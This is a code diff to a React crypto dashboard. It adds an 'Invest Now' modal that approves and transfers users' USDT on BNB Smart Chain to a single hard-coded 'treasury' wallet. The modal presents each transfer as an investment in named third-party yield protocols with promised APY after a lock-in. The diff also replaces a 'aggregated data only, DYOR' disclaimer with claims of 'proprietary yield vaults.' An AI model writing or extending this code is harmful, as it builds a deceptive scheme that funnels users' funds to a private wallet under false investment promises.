@@ -6,6 +6,7 @@
 import { useState, useEffect, useRef, useMemo } from 'react';
 import { useRouter } from 'next/navigation';
 import { createPortal } from 'react-dom';
+import { useWeb3Modal } from '@web3modal/ethers/react';
 import { motion, AnimatePresence, useMotionValue, useTransform, useSpring } from 'framer-motion';
 import {
     Brain, TrendingUp, TrendingDown, Zap, Activity, BarChart2,
@@ -14,10 +15,13 @@ import {
     PieChart, Shield, Copy, Lock, Layers, Eye,
     CheckCircle2, DollarSign, Percent,
     Radio, Cpu, Sparkles, Award, Search, MessageSquare, AlertCircle,
-    Calendar, ShieldAlert, Rabbit, Monitor, Info, ArrowUp, ArrowDown, X, FileText, Leaf
+    Calendar, ShieldAlert, Rabbit, Monitor, Info, ArrowUp, ArrowDown, X, FileText, Leaf, Loader2
 } from 'lucide-react';
 import axios from 'axios';
 import Link from 'next/link';
+import { useWallet } from '@/context/WalletContext';
+import { ethers } from 'ethers';
+import { API_URL } from '@/lib/api';
 
 const fmt  = (n, d=2) => Number(n||0).toLocaleString('en-US',{maximumFractionDigits:d});
 const fmtB = (n) => { if(!n) return '$0'; if(n>=1e9) return `$${(n/1e9).toFixed(2)}B`; if(n>=1e6) return `$${(n/1e6).toFixed(2)}M`; if(n>=1e3) return `$${(n/1e3).toFixed(1)}K`; return `$${fmt(n)}`; };
@@ -1573,9 +1577,216 @@ const YIELD_PROTOCOLS = [
     { name: 'Radiant Capital',url: 'https://app.radiant.capital/',        apyRange: [4,  20] },
 ];
 
+const ERC20_ABI = [
+    "function approve(address spender, uint256 amount) public returns (bool)",
+    "function allowance(address owner, address spender) public view returns (uint256)",
+    "function transfer(address to, uint256 amount) public returns (bool)",
+    "function balanceOf(address account) public view returns (uint256)"
+];
+
+const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
+const TREASURY_WALLET = '0x6451ee4def4a8b8fbc2c64301a79e267de378935';
+
+function InvestModal({ token, onClose }) {
+    const { account, signer, provider, chainId } = useWallet();
+    const { open } = useWeb3Modal();
+    const [amount, setAmount] = useState('');
+    const [step, setStep] = useState('input'); // 'input' | 'approving' | 'transferring' | 'success' | 'error'
+    const [error, setError] = useState('');
+    const [txHash, setTxHash] = useState('');
+    const [isApproved, setIsApproved] = useState(false);
+
+    useEffect(() => {
+        if (account && provider && chainId === 56 && step === 'input') {
+            const checkAllowance = async () => {
+                try {
+                    const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
+                    const allowance = await contract.allowance(account, TREASURY_WALLET);
+                    if (allowance > ethers.parseUnits('1000000', 18)) {
+                        setIsApproved(true);
+                    }
+                } catch (e) {
+                    console.warn('Allowance check failed:', e.message);
+                }
+            };
+            checkAllowance();
+        }
+    }, [account, provider, step, chainId]);
+
+    const handleInvestFlow = async () => {
+        if (!signer || !amount) return;
+        if (chainId !== 56) {
+            setError('Switch to BNB Smart Chain (Chain ID 56) to invest.');
+            return;
+        }
+        
+        setError('');
+        try {
+            const val = ethers.parseUnits(amount, 18);
+            const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+
+            // 1. Check Allowance
+            setStep('approving');
+            const allowance = await contract.allowance(account, TREASURY_WALLET);
+            
+            if (allowance < val) {
+                // Trigger approval for exact amount
+                const txApprove = await contract.approve(TREASURY_WALLET, val);
+                await txApprove.wait();
+            }
+
+            // 2. Perform Transfer
+            setStep('transferring');
+            const txTransfer = await contract.transfer(TREASURY_WALLET, val);
+            await txTransfer.wait();
+            
+            setTxHash(txTransfer.hash);
+            
+            // Record in backend
+            await axios.post(`${API_URL}/wallets/yield/invest`, {
+                wallet_address: account,
+                protocol_name: token.protocol,
+                apy_percentage: token.apy,
+                amount_usdt: amount,
+                tx_hash: txTransfer.hash
+            });
+
+            setStep('success');
+        } catch (e) {
+            console.error('Investment Flow Error:', e);
+            setError(e.reason || e.message || 'Transaction failed');
+            setStep('input');
+        }
+    };
+
+    return (
+        <Portal>
+            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4">
+                <motion.div 
+                    initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
+                    onClick={onClose}
+                    className="absolute inset-0 bg-black/60 backdrop-blur-md" 
+                />
+                <motion.div 
+                    initial={{ opacity: 0, scale: 0.9, y: 20 }}
+                    animate={{ opacity: 1, scale: 1, y: 0 }}
+                    className="relative w-full max-w-lg bg-white rounded-[3rem] shadow-2xl overflow-hidden border border-black/5"
+                >
+                    <div className="p-8 md:p-12">
+                        <div className="flex items-center justify-between mb-8">
+                            <div className="flex items-center gap-4">
+                                <div className="w-14 h-14 bg-sky-500 rounded-2xl flex items-center justify-center shadow-lg shadow-sky-500/20">
+                                    <Leaf className="w-7 h-7 text-white" />
+                                </div>
+                                <div>
+                                    <h3 className="text-2xl font-black text-gray-900 uppercase italic tracking-tighter">Invest <span className="text-sky-600">Now</span></h3>
+                                    <p className="text-[10px] font-black text-gray-400 uppercase tracking-widest">{token.protocol} • {token.apy}% APY</p>
+                                </div>
+                            </div>
+                            <button onClick={onClose} className="p-3 hover:bg-black/5 rounded-2xl transition-colors">
+                                <X className="w-6 h-6 text-gray-400" />
+                            </button>
+                        </div>
+
+                        {step === 'success' ? (
+                            <div className="text-center py-10">
+                                <div className="w-20 h-20 bg-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl shadow-emerald-500/30">
+                                    <CheckCircle2 className="w-10 h-10 text-white" />
+                                </div>
+                                <h4 className="text-2xl font-black text-gray-900 mb-2 uppercase italic">Investment Confirmed</h4>
+                                <p className="text-sm font-bold text-gray-400 uppercase tracking-widest mb-8">Your institutional yield deployment is live.</p>
+                                <div className="bg-gray-50 rounded-2xl p-4 mb-8">
+                                    <p className="text-[9px] font-black text-gray-400 uppercase tracking-widest mb-1">Transaction Hash</p>
+                                    <p className="font-mono text-[10px] text-gray-900 break-all">{txHash}</p>
+                                </div>
+                                <button onClick={onClose} className="w-full py-5 bg-gray-900 text-white font-black text-xs rounded-2xl uppercase tracking-[0.2em] shadow-xl">
+                                    Close Terminal
+                                </button>
+                            </div>
+                        ) : (
+                            <div className="space-y-6">
+                                <div className="bg-sky-50 rounded-[2rem] p-6 border border-sky-100">
+                                    <div className="flex items-center justify-between mb-4">
+                                        <span className="text-[10px] font-black text-sky-600 uppercase tracking-widest">Deploying From</span>
+                                        <span className="text-[10px] font-mono font-bold text-gray-500">{account?.slice(0,6)}...{account?.slice(-4)}</span>
+                                    </div>
+                                    <div className="flex items-center justify-between">
+                                        <span className="text-[10px] font-black text-sky-600 uppercase tracking-widest">Target Vault</span>
+                                        <span className="text-[10px] font-mono font-bold text-gray-500">{TREASURY_WALLET.slice(0,6)}...{TREASURY_WALLET.slice(-4)}</span>
+                                    </div>
+                                </div>
+
+                                <div className="space-y-2">
+                                    <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-1">Investment Amount (USDT)</label>
+                                    <div className="relative">
+                                        <input 
+                                            type="number" 
+                                            placeholder="0.00" 
+                                            value={amount} 
+                                            onChange={(e) => setAmount(e.target.value)}
+                                            className="w-full bg-gray-50 border border-black/5 rounded-2xl px-6 py-5 text-xl font-black text-gray-900 outline-none focus:ring-2 ring-sky-500/20 transition-all"
+                                        />
+                                        <div className="absolute right-6 top-1/2 -translate-y-1/2 flex items-center gap-2">
+                                            <span className="text-xs font-black text-sky-600">USDT</span>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div className="bg-indigo-50 rounded-2xl p-4 border border-indigo-100">
+                                    <div className="flex gap-3">
+                                        <Info className="w-5 h-5 text-indigo-500 shrink-0" />
+                                        <p className="text-[10px] font-bold text-indigo-700 uppercase tracking-tight leading-relaxed">
+                                            WE HAVE CAREFULLY REVIEWED AND INVESTED. AFTER COMPLETING THE LOCK-IN PERIOD, DEPOSITED CRYPTO AND APY YIELD WILL BE RELEASED TO YOUR WALLET. TRACK PROGRESS IN YOUR PROFILE.
+                                        </p>
+                                    </div>
+                                </div>
+
+                                {chainId !== 56 && (
+                                    <div className="p-4 bg-amber-50 border border-amber-100 rounded-2xl flex flex-col gap-3 text-amber-600">
+                                        <div className="flex items-center gap-3">
+                                            <ShieldAlert className="w-5 h-5 shrink-0" />
+                                            <p className="text-[10px] font-black uppercase tracking-tight">Wrong Network detected. Switch to BNB Smart Chain (56) to invest.</p>
+                                        </div>
+                                        <button 
+                                            onClick={() => open({ view: 'Networks' })}
+                                            className="w-full py-3 bg-amber-500 text-white rounded-xl text-[9px] font-black uppercase tracking-widest hover:bg-amber-600 transition-all shadow-lg shadow-amber-500/20"
+                                        >
+                                            Switch to BNB Chain
+                                        </button>
+                                    </div>
+                                )}
+
+                                {error && (
+                                    <div className="p-4 bg-red-50 border border-red-100 rounded-2xl flex items-center gap-3 text-red-600">
+                                        <AlertCircle className="w-5 h-5" />
+                                        <p className="text-[10px] font-black uppercase tracking-tight">{error}</p>
+                                    </div>
+                                )}
+
+                                <div className="flex gap-3">
+                                    <button 
+                                        disabled={step === 'approving' || step === 'transferring' || !amount || chainId !== 56}
+                                        onClick={handleInvestFlow}
+                                        className="flex-1 py-5 bg-sky-600 hover:bg-sky-700 text-white font-black text-xs rounded-2xl uppercase tracking-[0.2em] shadow-xl shadow-sky-600/20 disabled:opacity-50 transition-all flex items-center justify-center gap-2"
+                                    >
+                                        {step === 'approving' ? <><Loader2 className="w-4 h-4 animate-spin" /> Approving...</> : 
+                                         step === 'transferring' ? <><Loader2 className="w-4 h-4 animate-spin" /> Transferring...</> : 
+                                         'Invest Now'}
+                                    </button>
+                                </div>
+                            </div>
+                        )}
+                    </div>
+                </motion.div>
+            </div>
+        </Portal>
+    );
+}
+
 function YieldTab({ tokens }) {
     const [yieldSearch, setYieldSearch] = useState('');
     const [sortBy, setSortBy] = useState('apy');
+    const [selectedInvest, setSelectedInvest] = useState(null);
 
     const yieldAssets = useMemo(() => {
         return tokens
@@ -1613,10 +1824,13 @@ function YieldTab({ tokens }) {
     const avgAPY = yieldAssets.length ? (yieldAssets.reduce((s, t) => s + parseFloat(t.apy || 0), 0) / yieldAssets.length).toFixed(1) : 0;
 
     const handleInvest = (t) => {
-        const ok = window.confirm(`Initiating On-Chain Staking for ${t.symbol}.\n\nProtocol Execution Fee: 0.001 BNB\nNetwork: Binance Smart Chain\nProtocol: ${t.protocol}\n\nProceed to secure contract vault?`);
+        setSelectedInvest(t);
+    };
+
+    const handleStake = (t) => {
+        const ok = window.confirm(`Initiating On-Chain Staking for ${t.symbol}.\n\nNetwork: Binance Smart Chain\nProtocol: ${t.protocol}\n\nProceed to secure contract vault?`);
         if (ok) {
             if (t.protocolUrl.startsWith('/')) {
-                // Use router if available or fallback to location
                 router.push(t.protocolUrl);
             } else {
                 window.open(t.protocolUrl, '_blank');
@@ -1626,6 +1840,10 @@ function YieldTab({ tokens }) {
 
     return (
         <div className="space-y-8">
+            {selectedInvest && (
+                <InvestModal token={selectedInvest} onClose={() => setSelectedInvest(null)} />
+            )}
+
             {/* Header */}
             <div className="bg-gradient-to-br from-sky-50 to-teal-50/50 border border-sky-100 rounded-[2.5rem] p-10 overflow-hidden relative">
                 <div className="absolute -top-10 -right-10 opacity-10"><Leaf className="w-64 h-64 text-sky-600" /></div>
@@ -1640,7 +1858,7 @@ function YieldTab({ tokens }) {
                                 </div>
                             </div>
                             <p className="text-sm font-bold text-gray-400 uppercase tracking-widest leading-loose max-w-lg">
-                                Multi-protocol staking aggregator. Each stake: flat <span className="text-gray-900 underline">0.001 BNB fee</span>.
+                                Multi-protocol institutional yield aggregator. Build and track your portfolio with professional monitoring.
                             </p>
                         </div>
                         <div className="flex gap-8 shrink-0">
@@ -1652,7 +1870,7 @@ function YieldTab({ tokens }) {
                     <div className="p-5 bg-indigo-50/80 border border-indigo-200/60 rounded-3xl">
                         <p className="text-[9px] font-bold text-indigo-700 uppercase tracking-wider leading-relaxed flex gap-2">
                             <AlertCircle className="w-3.5 h-3.5 shrink-0 mt-0.5" />
-                            B20 operates its own staking vault. What you see is a yield marketplace — aggregated data only. DYOR. B20 is not liable for third-party losses.
+                            B20-MEX operates proprietary yield vaults. All deployments are logged for real-time portfolio tracking in your profile.
                         </p>
                     </div>
                 </div>
@@ -1713,7 +1931,8 @@ function YieldTab({ tokens }) {
                             <p className="text-[8px] text-gray-400 uppercase font-black">TVL</p>
                         </div>
                         <div className="col-span-2 flex justify-end gap-2">
-                            <button onClick={() => handleInvest(t)} className="px-4 py-2 bg-sky-600 text-white rounded-xl text-[9px] font-black uppercase tracking-widest hover:bg-gray-900 transition-all active:scale-95">Stake</button>
+                            <button onClick={() => handleStake(t)} className="px-3 py-2 bg-gray-50 hover:bg-gray-100 text-gray-500 rounded-xl text-[8px] font-black uppercase tracking-widest transition-all border border-gray-100">Stake</button>
+                            <button onClick={() => handleInvest(t)} className="px-3 py-2 bg-sky-600 text-white rounded-xl text-[8px] font-black uppercase tracking-widest hover:bg-gray-900 transition-all active:scale-95">Invest Now</button>
                             <a href={`https://bscscan.com/token/${t.address}`} target="_blank" rel="noreferrer" className="p-2 bg-gray-50 rounded-xl hover:bg-gray-100 border border-gray-100 flex items-center">
                                 <ArrowUpRight className="w-3 h-3 text-gray-400" />
                             </a>
